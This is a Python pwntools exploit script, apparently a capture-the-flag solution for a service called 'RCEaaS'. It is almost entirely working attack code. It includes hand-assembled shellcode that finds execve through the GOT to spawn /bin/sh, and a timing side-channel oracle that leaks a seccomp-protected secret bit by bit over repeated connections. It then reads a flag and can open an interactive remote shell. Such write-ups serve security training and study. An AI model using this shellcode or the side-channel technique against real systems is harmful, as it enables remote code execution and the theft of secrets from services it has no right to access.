#!/usr/bin/python3

#import libraries
import sys
import binascii
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13717
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


#Set this to True if you want an interactive shell in addition to the flag.
spawn_interactive_shell = False

#If set to true, the secret will be newly obtained from the server using an oracle attack via 
#  a time-based sidechannel. Is set to false the secret will be hardcoded.
obtain_secret = False
#This is how many seconds the connection needs to be kept alive before we interpret the result Bit 
#  as 1. If the connection is lost before the timeout is reached, the result Bit is set to 0.
sidechannel_timeout = 0.5


#This is where the exploit lives.
def exploit():

    if obtain_secret == True:
        secret = get_secret()
    else:
        secret = b'thm... 1n 5o\/ie7 ru5si4 7h3 P@s5W0rds Cr4ck Y0u\n\x00'

    print(f"(-) Secret in use: {secret}")
    print(f"    Secret as hex: {binascii.hexlify(secret).decode()}")

    proc = remote(host, port, fam="ipv4")
    print("(-) Establishing Connection.")
    proc.readuntil(b"Welcome to \033[1;32mRCEaaS\033[0m\n")

    #Now that we have entered the correct secret, we are no longer restricted by seccomp.
    #Hence any shellcode we manage to execute can easily spawn a shell.
    shellcode  = b""
    print("(-) Assembling shellcode.")
    # Move the address of puts@glibc from the GOT to rax
    # 0: 48 8b 04 25 a0 3f 40 00   mov    rax,QWORD PTR ds:0x403fa0
    shellcode += b"\x48\x8B\x04\x25\xA0\x3F\x40\x00"
    # Subtract the offset of puts() within glibc (0x72230) from the address of puts() to obtain 
    #   the glibc base address.
    # 8: 48 2d 30 22 07 00         sub    rax,0x72230
    shellcode += b"\x48\x2D\x30\x22\x07\x00"
    # Copy the glibc base address to rdi.
    # e: 48 89 c7                  mov    rdi,rax
    shellcode += b"\x48\x89\xC7"
    # Add the offset of execve() to the glibc base address in rax.
    #11: 48 05 00 7c 0c 00         add    rax,0xc7c00
    shellcode += b"\x48\x05\x00\x7C\x0C\x00"
    # Add the offset of the string b"/bin/sh\x00" within glibc to rdi.
    # This is the first argument of execve.
    #17: 48 81 c7 52 51 19 00      add    rdi,0x195152
    shellcode += b"\x48\x81\xC7\x52\x51\x19\x00"
    # Set the second argument of execve (rsi) to 0.
    #1e: 48 c7 c6 00 00 00 00      mov    rsi,0x0
    shellcode += b"\x48\xC7\xC6\x00\x00\x00\x00"
    # Set the third argument of execve (rdx) to 0.
    #25: 48 c7 c2 00 00 00 00      mov    rdx,0x0
    shellcode += b"\x48\xC7\xC2\x00\x00\x00\x00"
    # Call execve to spawn a shell.
    #2c: ff d0                     call   rax
    shellcode += b"\xFF\xD0"

    #Now how do we actually execute the shellcode?
    #For this let's interpret the secret as assembly code and take a look:
    #   0:   74 68                   je     0x6a
    #   2:   6d                      ins    DWORD PTR es:[rdi], dx
    #   3:   2e 2e 2e 20 31          cs cs cs and BYTE PTR [rcx], dh
    #   8:   6e                      outs   dx, BYTE PTR ds:[rsi]
    #   9:   20 35 6f 5c 2f 69       and    BYTE PTR [rip+0x692f5c6f], dh        # 0x692f5c7e
    #   f:   65 37                   gs (bad)
    #  11:   20 72 75                and    BYTE PTR [rdx+0x75], dh
    #  14:   35 73 69 34 20          xor    eax, 0x20346973
    #  19:   37                      (bad)
    #  1a:   68 33 20 50 40          push   0x40502033
    #  1f:   73 35                   jae    0x56
    #  21:   57                      push   rdi
    #  22:   30 72 64                xor    BYTE PTR [rdx+0x64], dh
    #  25:   73 20                   jae    0x47
    #  27:   43 72 34                rex.XB jb 0x5e
    #  2a:   63 6b 20                movsxd ebp, DWORD PTR [rbx+0x20]
    #  2d:   59                      pop    rcx
    #  2e:   30 75 0a                xor    BYTE PTR [rbp+0xa], dh
    #        ...
    #The first instruction is in fact a short jump equal, which jumps 0x6a byte forward if the 
    #  zero flag is set. Luckily, the zero flag is indeed set once we reach this instruction.
    #Hence we simply need to place our shellcode at offset 0x6a within the buffer and it will be 
    #  executed successfully.

    print(f"(-) Deploying Shellcode: {binascii.hexlify(shellcode).decode()}")
    if obtain_secret != True:
        #This is the minimal solution specifically tailored to the hardcoded secret
        proc.write(secret + (0x6a-len(secret))*b"\x00" + shellcode + b"\x00\n")
    else:
        #This is a more general solution employing a nop-slide that should work for more secrets.
        #If a random secret is used, there is still a greater than 1 in 256 chance of success, as
        #  most offsets for short je instructions would work (as long as we surpass the actual 
        #  secret and thus hit the nop slide) and several other (jump) instructions would also work.
        #The actual chance of success is a bit difficult to determine, as there are A LOT of exotic 
        #  combinations that work. But at least that should be a reasonable upper bound.
        proc.write(secret + (0x1000-(len(secret)+len(shellcode)+2)) * b"\x90" + shellcode + b"\x00\n")

    proc.readuntil(b"You seem trustworthy!\n")

    #Now get a flag
    print("(-) Trying to retrieve flag...")
    proc.write(b"/bin/get_flag\n")
    flag = proc.readline()
    if b'flag' in flag:
        print(f"(-) Successfully retrieved flag: {flag.decode()}")
    else:
        print("(-) Oops, something went wrong retrieving the flag.")

    if spawn_interactive_shell == True:
        print("Here's your interactive shell: ")
        proc.interactive()
    else:
        proc.write(b"exit")

    proc.close()
    return 0


def get_secret():

    code = b""

    # ## This is the assembly code we use.
    # ## Original asm written manually.
    # ## Assembled/Converted with https://defuse.ca/online-x86-assembler.htm
    code = b""
    # #We store the location of the current full_index directly after the assembly code in memory.
    # #Load that memory address to rbp. (rip points to next instruction at offset 0x7, assembly code 
    # #  is 0x4d byte long, hence [rip+0x4d-0x7] = [rip+0x46] is the desired address.
    # 0: 48 8d 2d 46 00 00 00    lea    rbp,[rip+0x46]
    code += b"\x48\x8D\x2D\x46\x00\x00\x00"
    # #Now move the byte_index, which is the full_index divided by 8, to rax.
    # 7: 48 8b 45 00             mov    rax,QWORD PTR [rbp+0x0]
    # b: 48 c1 e8 03             shr    rax,0x3
    code += b"\x48\x8B\x45\x00"
    code += b"\x48\xC1\xE8\x03"
    # #Then move the bit_index, which is the the full_index mod 8, to rcx.
    # f: 48 8b 4d 00             mov    rcx,QWORD PTR [rbp+0x0]
    #13: 48 83 e1 07             and    rcx,0x7
    #17: 48 ff c1                inc    rcx
    code += b"\x48\x8B\x4D\x00"
    code += b"\x48\x83\xE1\x07"
    code += b"\x48\xFF\xC1"
    # #Now use byte_index and bit_index to determine wether the current bit is 0 or 1.
    # #Note that 0x404060 is the address of char secret[0x100]. This will never change, as it is 
    # #  located in the .bss section and PIE is disabled.
    # #If it is 1, the carry flag will be set after this. Else it won't.
    #1a: 48 8b 98 60 40 40 00    mov    rbx,QWORD PTR [rax+0x404060]
    #21: 48 d3 eb                shr    rbx,cl
    #24: 73 1e                   jnc    44 <result_bit_zero>
    code += b"\x48\x8B\x98\x60\x40\x40\x00"
    code += b"\x48\xD3\xEB"
    code += b"\x73\x1E"
    #If the bit is 1, we simply initiate a loop to perpetually read from stdin. For this:
    #  - rdi is set to the filedescriptor of stdin, which is 0x0
    #  - rsi is set to a writable destination on the stack
    #  - rdx is set to 0x1, in order to read up to one byte. This will be a blocking operation and 
    #    hence keep the program alive as long as no input is read.
    #  - rax is set to the address of read@plt and then called.
    #Even if a byte is read, we simply reinitiate read(). This way the program will continue to wait 
    #  for input, and hence no EOF will be received if we attempt to read from the connection with 
    #  a reasonable timeout.
    #0000000000000026 <result_bit_one>:
    #26: 48 c7 c7 00 00 00 00    mov    rdi,0x0
    #2d: 48 8d 74 24 f8          lea    rsi,[rsp-0x8]
    #32: 48 c7 c2 01 00 00 00    mov    rdx,0x1
    #39: 48 c7 c0 70 10 40 00    mov    rax,0x401070
    #40: ff d0                   call   rax
    #42: eb e2                   jmp    26 <result_bit_one>
    code += b"\x48\xC7\xC7\x00\x00\x00\x00"
    code += b"\x48\x8D\x74\x24\xF8"
    code += b"\x48\xC7\xC2\x01\x00\x00\x00"
    code += b"\x48\xC7\xC0\x70\x10\x40\x00"
    code += b"\xFF\xD0"
    code += b"\xEB\xE2"
    #If the bit is 0, we simply call exit@plt, to terminate the program.
    #0000000000000044 <result_bit_zero>:
    #44: 48 c7 c0 c0 10 40 00    mov    rax,0x4010c0
    #4b: ff d0                   call   rax
    code += b"\x48\xC7\xC0\xC0\x10\x40\x00"
    code += b"\xFF\xD0"

    index_pos = 0
    secret = b""

    #To determine the secret we use an oracle attack using a time-based sidechannel to extract 
    #  the secret information bit- by bit across multiple connections.
    #This is necessarry, since we cannot write to stdout or stderr once seccomp has been enabled.
    #The sidechannel does however work, since we can still process userinput and either keep the 
    #  connection open or close it at will depending on the input.
    #Additionally the secret is static and hence stays the same across connections, which allows 
    #  us to use arbitrarily many consecutive connections to retrieve the information.

    #First iterate over all bytes the secret may contain
    print("(-) Retrieving Secret via Sidechannel.")
    for byte_index in range(0,256):
        curr_byte = 0
        print(f"{byte_index:3d}: ", end='')
        #Then iterate over all bits of the current byte
        for bit_index in reversed(range(0,8)):
            #The full index, which is simply a combination of the byte and bit index, will be part 
            #  of our input. To see how th index is processed on the server side, see our 
            #  assembly code above.
            full_index = (byte_index << 3) + bit_index
            proc = remote(host, port, fam="ipv4")
            proc.readuntil(b"Welcome to [1;32mRCEaaS[0m\n")
            #Executing arbitrary code is trivial, as our input is simply executed on the server 
            #  side. The only difficulty is, that we can only communicate with the outside world 
            #  via sidechannels. The exact inner workings of our assembly code are explained above.
            proc.write(code + p64(full_index) + b"\n")
            try:
                #Now try to read a response. Of course we do not actually expect to get one, but 
                #  simply use this as a tool to check if the connection is kept alive until a 
                #  certain timeout is reached.
                proc.readline(timeout=sidechannel_timeout)
                #We only reach this point if the connection survives the timeout. -> Bit 1
                #If the connection is slow, increasing the timeout may help reduce false positives.
                #An incorrect secret usually indicates that timeout needs to be indreased.
                curr_bit = 1
            #EOFException:
            #  Connection closed due to exit() called by us. -> Bit 0
            #  Any I/O error while reading bit at current index may also lead to false results.
            #  Try again and compare results to spot inconsistencies if secret is incorrect.
            except EOFError:
                curr_bit = 0
            finally:
                curr_byte = (curr_byte << 1) + curr_bit
                print(f"{curr_bit}", end='')
                proc.close()

        #We add the bit we retrieved to our secret and repeat the process.
        secret += curr_byte.to_bytes(1,'little')
        #If we encounter a NULL byte, we have reached the end of the secret and exit the loop.
        print(f" {chr(curr_byte)} {curr_byte:#0{0}4x}")
        if curr_byte == 0:
            break

    print(f"(-) Retrieved Secret: {secret}")
    return secret

#Invoke the exploit when the script is executed.
exploit()


